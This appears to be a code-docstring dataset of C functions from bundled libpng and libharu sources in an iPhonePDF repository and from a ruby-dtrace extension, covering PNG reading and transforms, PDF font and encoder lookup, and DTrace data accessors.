{"docstring": "/* Create a PNG structure for reading, and allocate any memory needed. */\n", "func_signal": "png_structp PNGAPI\npng_create_read_struct(png_const_charp user_png_ver, png_voidp error_ptr,\n   png_error_ptr error_fn, png_error_ptr warn_fn)", "code": "{\n\n#ifdef PNG_USER_MEM_SUPPORTED\n   return (png_create_read_struct_2(user_png_ver, error_ptr, error_fn,\n      warn_fn, png_voidp_NULL, png_malloc_ptr_NULL, png_free_ptr_NULL));\n}", "path": "Support\\libpng\\pngread.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/* Initialize palette, background, etc, after transformations\n * are set, but before any reading takes place.  This allows\n * the user to obtain a gamma-corrected palette, for example.\n * If the user doesn't call this, we will do it ourselves.\n */\n", "func_signal": "void PNGAPI\npng_start_read_image(png_structp png_ptr)", "code": "{\n   png_debug(1, \"in png_start_read_image\");\n   if (png_ptr == NULL)\n      return;\n   if (!(png_ptr->flags & PNG_FLAG_ROW_INIT))\n      png_read_start_row(png_ptr);\n}", "path": "Support\\libpng\\pngread.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/* This function returns a pointer to the user_transform_ptr associated with\n * the user transform functions.  The application should free any memory\n * associated with this pointer before png_write_destroy and png_read_destroy\n * are called.\n */\n", "func_signal": "png_voidp PNGAPI\npng_get_user_transform_ptr(png_structp png_ptr)", "code": "{\n   if (png_ptr == NULL)\n      return (NULL);\n#if defined(PNG_USER_TRANSFORM_PTR_SUPPORTED)\n   return ((png_voidp)png_ptr->user_transform_ptr);\n#else\n   return (NULL);\n#endif\n}", "path": "Support\\libpng\\pngtrans.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/* Turn on 16 bit byte swapping */\n", "func_signal": "void PNGAPI\npng_set_swap(png_structp png_ptr)", "code": "{\n   png_debug(1, \"in png_set_swap\");\n   if (png_ptr == NULL)\n      return;\n   if (png_ptr->bit_depth == 16)\n      png_ptr->transformations |= PNG_SWAP_BYTES;\n}", "path": "Support\\libpng\\pngtrans.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/*----- font handling -------------------------------------------------------*/\n", "func_signal": "static void\nFreeFontDefList  (HPDF_Doc   pdf)", "code": "{\n    HPDF_List list = pdf->fontdef_list;\n    HPDF_UINT i;\n\n    HPDF_PTRACE ((\" HPDF_Doc_FreeFontDefList\\n\"));\n\n    for (i = 0; i < list->count; i++) {\n        HPDF_FontDef def = (HPDF_FontDef)HPDF_List_ItemAt (list, i);\n\n        HPDF_FontDef_Free (def);\n    }\n\n    HPDF_List_Free (list);\n\n    pdf->fontdef_list = NULL;\n}", "path": "Support\\libharu\\hpdf_doc.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/*----- encoder handling ----------------------------------------------------*/\n", "func_signal": "HPDF_Encoder\nHPDF_Doc_FindEncoder  (HPDF_Doc         pdf,\n                       const char  *encoding_name)", "code": "{\n    HPDF_List list = pdf->encoder_list;\n    HPDF_UINT i;\n\n    HPDF_PTRACE ((\" HPDF_Doc_FindEncoder\\n\"));\n\n    for (i = 0; i < list->count; i++) {\n        HPDF_Encoder encoder = (HPDF_Encoder)HPDF_List_ItemAt (list, i);\n\n        if (HPDF_StrCmp (encoding_name, encoder->name) == 0) {\n\n            /* if encoder is uninitialize, call init_fn() */\n            if (encoder->type == HPDF_ENCODER_TYPE_UNINITIALIZED) {\n                if (!encoder->init_fn ||\n                    encoder->init_fn (encoder) != HPDF_OK)\n                    return NULL;\n            }\n\n            return encoder;\n        }\n    }\n\n    return NULL;\n}", "path": "Support\\libharu\\hpdf_doc.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/* Read the information before the actual image data.  This has been\n * changed in v0.90 to allow reading a file that already has the magic\n * bytes read from the stream.  You can tell libpng how many bytes have\n * been read from the beginning of the stream (up to the maximum of 8)\n * via png_set_sig_bytes(), and we will only check the remaining bytes\n * here.  The application can then have access to the signature bytes we\n * read if it is determined that this isn't a valid PNG file.\n */\n", "func_signal": "void PNGAPI\npng_read_info(png_structp png_ptr, png_infop info_ptr)", "code": "{\n   if (png_ptr == NULL || info_ptr == NULL)\n      return;\n   png_debug(1, \"in png_read_info\");\n   /* If we haven't checked all of the PNG signature bytes, do so now. */\n   if (png_ptr->sig_bytes < 8)\n   {\n      png_size_t num_checked = png_ptr->sig_bytes,\n                 num_to_check = 8 - num_checked;\n\n      png_read_data(png_ptr, &(info_ptr->signature[num_checked]), num_to_check);\n      png_ptr->sig_bytes = 8;\n\n      if (png_sig_cmp(info_ptr->signature, num_checked, num_to_check))\n      {\n         if (num_checked < 4 &&\n             png_sig_cmp(info_ptr->signature, num_checked, num_to_check - 4))\n            png_error(png_ptr, \"Not a PNG file\");\n         else\n            png_error(png_ptr, \"PNG file corrupted by ASCII conversion\");\n      }\n      if (num_checked < 3)\n         png_ptr->mode |= PNG_HAVE_PNG_SIGNATURE;\n   }\n\n   for (;;)\n   {\n#ifdef PNG_USE_LOCAL_ARRAYS\n      PNG_CONST PNG_IHDR;\n      PNG_CONST PNG_IDAT;\n      PNG_CONST PNG_IEND;\n      PNG_CONST PNG_PLTE;\n#if defined(PNG_READ_bKGD_SUPPORTED)\n      PNG_CONST PNG_bKGD;\n#endif\n#if defined(PNG_READ_cHRM_SUPPORTED)\n      PNG_CONST PNG_cHRM;\n#endif\n#if defined(PNG_READ_gAMA_SUPPORTED)\n      PNG_CONST PNG_gAMA;\n#endif\n#if defined(PNG_READ_hIST_SUPPORTED)\n      PNG_CONST PNG_hIST;\n#endif\n#if defined(PNG_READ_iCCP_SUPPORTED)\n      PNG_CONST PNG_iCCP;\n#endif\n#if defined(PNG_READ_iTXt_SUPPORTED)\n      PNG_CONST PNG_iTXt;\n#endif\n#if defined(PNG_READ_oFFs_SUPPORTED)\n      PNG_CONST PNG_oFFs;\n#endif\n#if defined(PNG_READ_pCAL_SUPPORTED)\n      PNG_CONST PNG_pCAL;\n#endif\n#if defined(PNG_READ_pHYs_SUPPORTED)\n      PNG_CONST PNG_pHYs;\n#endif\n#if defined(PNG_READ_sBIT_SUPPORTED)\n      PNG_CONST PNG_sBIT;\n#endif\n#if defined(PNG_READ_sCAL_SUPPORTED)\n      PNG_CONST PNG_sCAL;\n#endif\n#if defined(PNG_READ_sPLT_SUPPORTED)\n      PNG_CONST PNG_sPLT;\n#endif\n#if defined(PNG_READ_sRGB_SUPPORTED)\n      PNG_CONST PNG_sRGB;\n#endif\n#if defined(PNG_READ_tEXt_SUPPORTED)\n      PNG_CONST PNG_tEXt;\n#endif\n#if defined(PNG_READ_tIME_SUPPORTED)\n      PNG_CONST PNG_tIME;\n#endif\n#if defined(PNG_READ_tRNS_SUPPORTED)\n      PNG_CONST PNG_tRNS;\n#endif\n#if defined(PNG_READ_zTXt_SUPPORTED)\n      PNG_CONST PNG_zTXt;\n#endif\n#endif /* PNG_USE_LOCAL_ARRAYS */\n      png_uint_32 length = png_read_chunk_header(png_ptr);\n      PNG_CONST png_bytep chunk_name = png_ptr->chunk_name;\n\n      /* This should be a binary subdivision search or a hash for\n       * matching the chunk name rather than a linear search.\n       */\n      if (!png_memcmp(chunk_name, png_IDAT, 4))\n        if (png_ptr->mode & PNG_AFTER_IDAT)\n          png_ptr->mode |= PNG_HAVE_CHUNK_AFTER_IDAT;\n\n      if (!png_memcmp(chunk_name, png_IHDR, 4))\n         png_handle_IHDR(png_ptr, info_ptr, length);\n      else if (!png_memcmp(chunk_name, png_IEND, 4))\n         png_handle_IEND(png_ptr, info_ptr, length);\n#ifdef PNG_HANDLE_AS_UNKNOWN_SUPPORTED\n      else if (png_handle_as_unknown(png_ptr, chunk_name))\n      {\n         if (!png_memcmp(chunk_name, png_IDAT, 4))\n            png_ptr->mode |= PNG_HAVE_IDAT;\n         png_handle_unknown(png_ptr, info_ptr, length);\n         if (!png_memcmp(chunk_name, png_PLTE, 4))\n            png_ptr->mode |= PNG_HAVE_PLTE;\n         else if (!png_memcmp(chunk_name, png_IDAT, 4))\n         {\n            if (!(png_ptr->mode & PNG_HAVE_IHDR))\n               png_error(png_ptr, \"Missing IHDR before IDAT\");\n            else if (png_ptr->color_type == PNG_COLOR_TYPE_PALETTE &&\n                     !(png_ptr->mode & PNG_HAVE_PLTE))\n               png_error(png_ptr, \"Missing PLTE before IDAT\");\n            break;\n         }\n      }\n#endif\n      else if (!png_memcmp(chunk_name, png_PLTE, 4))\n         png_handle_PLTE(png_ptr, info_ptr, length);\n      else if (!png_memcmp(chunk_name, png_IDAT, 4))\n      {\n         if (!(png_ptr->mode & PNG_HAVE_IHDR))\n            png_error(png_ptr, \"Missing IHDR before IDAT\");\n         else if (png_ptr->color_type == PNG_COLOR_TYPE_PALETTE &&\n                  !(png_ptr->mode & PNG_HAVE_PLTE))\n            png_error(png_ptr, \"Missing PLTE before IDAT\");\n\n         png_ptr->idat_size = length;\n         png_ptr->mode |= PNG_HAVE_IDAT;\n         break;\n      }\n#if defined(PNG_READ_bKGD_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_bKGD, 4))\n         png_handle_bKGD(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_cHRM_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_cHRM, 4))\n         png_handle_cHRM(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_gAMA_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_gAMA, 4))\n         png_handle_gAMA(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_hIST_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_hIST, 4))\n         png_handle_hIST(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_oFFs_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_oFFs, 4))\n         png_handle_oFFs(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_pCAL_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_pCAL, 4))\n         png_handle_pCAL(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_sCAL_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_sCAL, 4))\n         png_handle_sCAL(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_pHYs_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_pHYs, 4))\n         png_handle_pHYs(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_sBIT_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_sBIT, 4))\n         png_handle_sBIT(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_sRGB_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_sRGB, 4))\n         png_handle_sRGB(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_iCCP_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_iCCP, 4))\n         png_handle_iCCP(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_sPLT_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_sPLT, 4))\n         png_handle_sPLT(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_tEXt_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_tEXt, 4))\n         png_handle_tEXt(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_tIME_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_tIME, 4))\n         png_handle_tIME(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_tRNS_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_tRNS, 4))\n         png_handle_tRNS(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_zTXt_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_zTXt, 4))\n         png_handle_zTXt(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_iTXt_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_iTXt, 4))\n         png_handle_iTXt(png_ptr, info_ptr, length);\n#endif\n      else\n         png_handle_unknown(png_ptr, info_ptr, length);\n   }\n}", "path": "Support\\libpng\\pngread.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/* Turn on BGR-to-RGB mapping */\n", "func_signal": "void PNGAPI\npng_set_bgr(png_structp png_ptr)", "code": "{\n   png_debug(1, \"in png_set_bgr\");\n   if (png_ptr == NULL)\n      return;\n   png_ptr->transformations |= PNG_BGR;\n}", "path": "Support\\libpng\\pngtrans.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/*----- font handling -------------------------------------------------------*/\n", "func_signal": "HPDF_Font\nHPDF_Doc_FindFont  (HPDF_Doc          pdf,\n                    const char  *font_name,\n                    const char  *encoding_name)", "code": "{\n    HPDF_UINT i;\n    HPDF_Font font;\n\n    HPDF_PTRACE ((\" HPDF_Doc_FindFont\\n\"));\n\n    for (i = 0; i < pdf->font_mgr->count; i++) {\n        HPDF_FontAttr attr;\n\n        font = (HPDF_Font)HPDF_List_ItemAt (pdf->font_mgr, i);\n        attr = (HPDF_FontAttr) font->attr;\n\n        if (HPDF_StrCmp (attr->fontdef->base_font, font_name) == 0 &&\n                HPDF_StrCmp (attr->encoder->name, encoding_name) == 0)\n            return font;\n    }\n\n    return NULL;\n}", "path": "Support\\libharu\\hpdf_doc.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/* PNG_1_0_X || PNG_1_2_X */\n", "func_signal": "void PNGAPI\npng_read_init_3(png_structpp ptr_ptr, png_const_charp user_png_ver,\n   png_size_t png_struct_size)", "code": "{\n#ifdef PNG_SETJMP_SUPPORTED\n   jmp_buf tmp_jmp;  /* to save current jump buffer */\n#endif\n\n   int i = 0;\n\n   png_structp png_ptr=*ptr_ptr;\n\n   if (png_ptr == NULL)\n      return;\n\n   do\n   {\n     if (user_png_ver[i] != png_libpng_ver[i])\n     {\n#ifdef PNG_LEGACY_SUPPORTED\n       png_ptr->flags |= PNG_FLAG_LIBRARY_MISMATCH;\n#else\n       png_ptr->warning_fn = NULL;\n       png_warning(png_ptr,\n        \"Application uses deprecated png_read_init() and should be recompiled.\");\n       break;\n#endif\n     }\n   } while (png_libpng_ver[i++]);\n\n   png_debug(1, \"in png_read_init_3\");\n\n#ifdef PNG_SETJMP_SUPPORTED\n   /* Save jump buffer and error functions */\n   png_memcpy(tmp_jmp, png_ptr->jmpbuf, png_sizeof(jmp_buf));\n#endif\n\n   if (png_sizeof(png_struct) > png_struct_size)\n   {\n      png_destroy_struct(png_ptr);\n      *ptr_ptr = (png_structp)png_create_struct(PNG_STRUCT_PNG);\n      png_ptr = *ptr_ptr;\n   }\n\n   /* Reset all variables to 0 */\n   png_memset(png_ptr, 0, png_sizeof(png_struct));\n\n#ifdef PNG_SETJMP_SUPPORTED\n   /* Restore jump buffer */\n   png_memcpy(png_ptr->jmpbuf, tmp_jmp, png_sizeof(jmp_buf));\n#endif\n\n   /* Added at libpng-1.2.6 */\n#ifdef PNG_SET_USER_LIMITS_SUPPORTED\n   png_ptr->user_width_max=PNG_USER_WIDTH_MAX;\n   png_ptr->user_height_max=PNG_USER_HEIGHT_MAX;\n#endif\n\n   /* Initialize zbuf - compression buffer */\n   png_ptr->zbuf_size = PNG_ZBUF_SIZE;\n   png_ptr->zbuf = (png_bytep)png_malloc(png_ptr,\n     (png_uint_32)png_ptr->zbuf_size);\n   png_ptr->zstream.zalloc = png_zalloc;\n   png_ptr->zstream.zfree = png_zfree;\n   png_ptr->zstream.opaque = (voidpf)png_ptr;\n\n   switch (inflateInit(&png_ptr->zstream))\n   {\n     case Z_OK: /* Do nothing */ break;\n     case Z_MEM_ERROR:\n     case Z_STREAM_ERROR: png_error(png_ptr, \"zlib memory\"); break;\n     case Z_VERSION_ERROR: png_error(png_ptr, \"zlib version\"); break;\n     default: png_error(png_ptr, \"Unknown zlib error\");\n   }\n\n   png_ptr->zstream.next_out = png_ptr->zbuf;\n   png_ptr->zstream.avail_out = (uInt)png_ptr->zbuf_size;\n\n   png_set_read_fn(png_ptr, png_voidp_NULL, png_rw_ptr_NULL);\n}", "path": "Support\\libpng\\pngread.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/* Added to libpng-1.2.7 */\n", "func_signal": "void PNGAPI\npng_set_add_alpha(png_structp png_ptr, png_uint_32 filler, int filler_loc)", "code": "{\n   png_debug(1, \"in png_set_add_alpha\");\n   if (png_ptr == NULL)\n      return;\n   png_set_filler(png_ptr, filler, filler_loc);\n   png_ptr->transformations |= PNG_ADD_ALPHA;\n}", "path": "Support\\libpng\\pngtrans.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/* Free all memory used by the read */\n", "func_signal": "void PNGAPI\npng_destroy_read_struct(png_structpp png_ptr_ptr, png_infopp info_ptr_ptr,\n   png_infopp end_info_ptr_ptr)", "code": "{\n   png_structp png_ptr = NULL;\n   png_infop info_ptr = NULL, end_info_ptr = NULL;\n#ifdef PNG_USER_MEM_SUPPORTED\n   png_free_ptr free_fn = NULL;\n   png_voidp mem_ptr = NULL;\n#endif\n\n   png_debug(1, \"in png_destroy_read_struct\");\n   if (png_ptr_ptr != NULL)\n      png_ptr = *png_ptr_ptr;\n   if (png_ptr == NULL)\n      return;\n\n#ifdef PNG_USER_MEM_SUPPORTED\n   free_fn = png_ptr->free_fn;\n   mem_ptr = png_ptr->mem_ptr;\n#endif\n\n   if (info_ptr_ptr != NULL)\n      info_ptr = *info_ptr_ptr;\n\n   if (end_info_ptr_ptr != NULL)\n      end_info_ptr = *end_info_ptr_ptr;\n\n   png_read_destroy(png_ptr, info_ptr, end_info_ptr);\n\n   if (info_ptr != NULL)\n   {\n#if defined(PNG_TEXT_SUPPORTED)\n      png_free_data(png_ptr, info_ptr, PNG_FREE_TEXT, -1);\n#endif\n\n#ifdef PNG_USER_MEM_SUPPORTED\n      png_destroy_struct_2((png_voidp)info_ptr, (png_free_ptr)free_fn,\n          (png_voidp)mem_ptr);\n#else\n      png_destroy_struct((png_voidp)info_ptr);\n#endif\n      *info_ptr_ptr = NULL;\n   }\n\n   if (end_info_ptr != NULL)\n   {\n#if defined(PNG_READ_TEXT_SUPPORTED)\n      png_free_data(png_ptr, end_info_ptr, PNG_FREE_TEXT, -1);\n#endif\n#ifdef PNG_USER_MEM_SUPPORTED\n      png_destroy_struct_2((png_voidp)end_info_ptr, (png_free_ptr)free_fn,\n         (png_voidp)mem_ptr);\n#else\n      png_destroy_struct((png_voidp)end_info_ptr);\n#endif\n      *end_info_ptr_ptr = NULL;\n   }\n\n   if (png_ptr != NULL)\n   {\n#ifdef PNG_USER_MEM_SUPPORTED\n      png_destroy_struct_2((png_voidp)png_ptr, (png_free_ptr)free_fn,\n          (png_voidp)mem_ptr);\n#else\n      png_destroy_struct((png_voidp)png_ptr);\n#endif\n      *png_ptr_ptr = NULL;\n   }\n}", "path": "Support\\libpng\\pngread.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/* Read the end of the PNG file.  Will not read past the end of the\n * file, will verify the end is accurate, and will read any comments\n * or time information at the end of the file, if info is not NULL.\n */\n", "func_signal": "void PNGAPI\npng_read_end(png_structp png_ptr, png_infop info_ptr)", "code": "{\n   png_debug(1, \"in png_read_end\");\n   if (png_ptr == NULL)\n      return;\n   png_crc_finish(png_ptr, 0); /* Finish off CRC from last IDAT chunk */\n\n   do\n   {\n#ifdef PNG_USE_LOCAL_ARRAYS\n      PNG_CONST PNG_IHDR;\n      PNG_CONST PNG_IDAT;\n      PNG_CONST PNG_IEND;\n      PNG_CONST PNG_PLTE;\n#if defined(PNG_READ_bKGD_SUPPORTED)\n      PNG_CONST PNG_bKGD;\n#endif\n#if defined(PNG_READ_cHRM_SUPPORTED)\n      PNG_CONST PNG_cHRM;\n#endif\n#if defined(PNG_READ_gAMA_SUPPORTED)\n      PNG_CONST PNG_gAMA;\n#endif\n#if defined(PNG_READ_hIST_SUPPORTED)\n      PNG_CONST PNG_hIST;\n#endif\n#if defined(PNG_READ_iCCP_SUPPORTED)\n      PNG_CONST PNG_iCCP;\n#endif\n#if defined(PNG_READ_iTXt_SUPPORTED)\n      PNG_CONST PNG_iTXt;\n#endif\n#if defined(PNG_READ_oFFs_SUPPORTED)\n      PNG_CONST PNG_oFFs;\n#endif\n#if defined(PNG_READ_pCAL_SUPPORTED)\n      PNG_CONST PNG_pCAL;\n#endif\n#if defined(PNG_READ_pHYs_SUPPORTED)\n      PNG_CONST PNG_pHYs;\n#endif\n#if defined(PNG_READ_sBIT_SUPPORTED)\n      PNG_CONST PNG_sBIT;\n#endif\n#if defined(PNG_READ_sCAL_SUPPORTED)\n      PNG_CONST PNG_sCAL;\n#endif\n#if defined(PNG_READ_sPLT_SUPPORTED)\n      PNG_CONST PNG_sPLT;\n#endif\n#if defined(PNG_READ_sRGB_SUPPORTED)\n      PNG_CONST PNG_sRGB;\n#endif\n#if defined(PNG_READ_tEXt_SUPPORTED)\n      PNG_CONST PNG_tEXt;\n#endif\n#if defined(PNG_READ_tIME_SUPPORTED)\n      PNG_CONST PNG_tIME;\n#endif\n#if defined(PNG_READ_tRNS_SUPPORTED)\n      PNG_CONST PNG_tRNS;\n#endif\n#if defined(PNG_READ_zTXt_SUPPORTED)\n      PNG_CONST PNG_zTXt;\n#endif\n#endif /* PNG_USE_LOCAL_ARRAYS */\n      png_uint_32 length = png_read_chunk_header(png_ptr);\n      PNG_CONST png_bytep chunk_name = png_ptr->chunk_name;\n\n      if (!png_memcmp(chunk_name, png_IHDR, 4))\n         png_handle_IHDR(png_ptr, info_ptr, length);\n      else if (!png_memcmp(chunk_name, png_IEND, 4))\n         png_handle_IEND(png_ptr, info_ptr, length);\n#ifdef PNG_HANDLE_AS_UNKNOWN_SUPPORTED\n      else if (png_handle_as_unknown(png_ptr, chunk_name))\n      {\n         if (!png_memcmp(chunk_name, png_IDAT, 4))\n         {\n            if ((length > 0) || (png_ptr->mode & PNG_HAVE_CHUNK_AFTER_IDAT))\n               png_error(png_ptr, \"Too many IDAT's found\");\n         }\n         png_handle_unknown(png_ptr, info_ptr, length);\n         if (!png_memcmp(chunk_name, png_PLTE, 4))\n            png_ptr->mode |= PNG_HAVE_PLTE;\n      }\n#endif\n      else if (!png_memcmp(chunk_name, png_IDAT, 4))\n      {\n         /* Zero length IDATs are legal after the last IDAT has been\n          * read, but not after other chunks have been read.\n          */\n         if ((length > 0) || (png_ptr->mode & PNG_HAVE_CHUNK_AFTER_IDAT))\n            png_error(png_ptr, \"Too many IDAT's found\");\n         png_crc_finish(png_ptr, length);\n      }\n      else if (!png_memcmp(chunk_name, png_PLTE, 4))\n         png_handle_PLTE(png_ptr, info_ptr, length);\n#if defined(PNG_READ_bKGD_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_bKGD, 4))\n         png_handle_bKGD(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_cHRM_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_cHRM, 4))\n         png_handle_cHRM(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_gAMA_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_gAMA, 4))\n         png_handle_gAMA(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_hIST_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_hIST, 4))\n         png_handle_hIST(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_oFFs_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_oFFs, 4))\n         png_handle_oFFs(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_pCAL_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_pCAL, 4))\n         png_handle_pCAL(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_sCAL_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_sCAL, 4))\n         png_handle_sCAL(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_pHYs_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_pHYs, 4))\n         png_handle_pHYs(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_sBIT_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_sBIT, 4))\n         png_handle_sBIT(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_sRGB_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_sRGB, 4))\n         png_handle_sRGB(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_iCCP_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_iCCP, 4))\n         png_handle_iCCP(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_sPLT_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_sPLT, 4))\n         png_handle_sPLT(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_tEXt_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_tEXt, 4))\n         png_handle_tEXt(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_tIME_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_tIME, 4))\n         png_handle_tIME(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_tRNS_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_tRNS, 4))\n         png_handle_tRNS(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_zTXt_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_zTXt, 4))\n         png_handle_zTXt(png_ptr, info_ptr, length);\n#endif\n#if defined(PNG_READ_iTXt_SUPPORTED)\n      else if (!png_memcmp(chunk_name, png_iTXt, 4))\n         png_handle_iTXt(png_ptr, info_ptr, length);\n#endif\n      else\n         png_handle_unknown(png_ptr, info_ptr, length);\n   } while (!(png_ptr->mode & PNG_HAVE_IEND));\n}", "path": "Support\\libpng\\pngread.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/* Add a filler byte on read, or remove a filler or alpha byte on write.\n * The filler type has changed in v0.95 to allow future 2-byte fillers\n * for 48-bit input data, as well as to avoid problems with some compilers\n * that don't like bytes as parameters.\n */\n", "func_signal": "void PNGAPI\npng_set_filler(png_structp png_ptr, png_uint_32 filler, int filler_loc)", "code": "{\n   png_debug(1, \"in png_set_filler\");\n   if (png_ptr == NULL)\n      return;\n   png_ptr->transformations |= PNG_FILLER;\n   png_ptr->filler = (png_byte)filler;\n   if (filler_loc == PNG_FILLER_AFTER)\n      png_ptr->flags |= PNG_FLAG_FILLER_AFTER;\n   else\n      png_ptr->flags &= ~PNG_FLAG_FILLER_AFTER;\n\n   /* This should probably go in the \"do_read_filler\" routine.\n    * I attempted to do that in libpng-1.0.1a but that caused problems\n    * so I restored it in libpng-1.0.2a\n   */\n\n   if (png_ptr->color_type == PNG_COLOR_TYPE_RGB)\n   {\n      png_ptr->usr_channels = 4;\n   }\n\n   /* Also I added this in libpng-1.0.2a (what happens when we expand\n    * a less-than-8-bit grayscale to GA? */\n\n   if (png_ptr->color_type == PNG_COLOR_TYPE_GRAY && png_ptr->bit_depth >= 8)\n   {\n      png_ptr->usr_channels = 2;\n   }\n}", "path": "Support\\libpng\\pngtrans.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/*\n * Returns the type of action which generated this recdesc.\n * (exit, printf, printa or \"other\" for all other actions).\n */\n", "func_signal": "VALUE dtracerecdesc_action(VALUE self)", "code": "{\n  dtrace_recdesc_t *recdesc;\n  VALUE v;\n  Data_Get_Struct(self, dtrace_recdesc_t, recdesc);\n\n  if (recdesc){\n    switch (recdesc->dtrd_action) {\n    case DTRACEACT_EXIT:\n      v = rb_str_new2(\"exit\");\n      break;\n    case DTRACEACT_PRINTF:\n      v = rb_str_new2(\"printf\");\n      break;\n    case DTRACEACT_PRINTA:\n      v = rb_str_new2(\"printa\");\n      break;\n    default:\n      v = rb_str_new2(\"other\");\n      break;\n    }\n    return v;\n  }\n  else {\n    return Qnil;\n  }\n}", "path": "ext\\dtrace_recdesc.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/* Returns the flow kind given to this data by DTrace */\n", "func_signal": "VALUE dtraceprobedata_flow(VALUE self)", "code": "{\n  dtrace_probedata_t *data;\n\n  Data_Get_Struct(self, dtrace_probedata_t, data);\n\n  switch (data->dtpda_flow) {\n  case DTRACEFLOW_ENTRY:\n    return rb_str_new2(\"->\");\n    break;\n  case DTRACEFLOW_RETURN:\n    return rb_str_new2(\"<-\");\n    break;\n  default:\n    return Qnil;\n  }\n}", "path": "ext\\dtrace_probedata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/* Returns the address of the fault if any */\n", "func_signal": "VALUE dtraceerrdata_addr(VALUE self)", "code": "{\n  dtrace_errdata_t *data;\n\n  Data_Get_Struct(self, dtrace_errdata_t, data);\n\n  if (data) {\n    return INT2FIX(data->dteda_addr);\n  }\n  else {\n    return Qnil;\n  }\n}", "path": "ext\\dtrace_errdata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
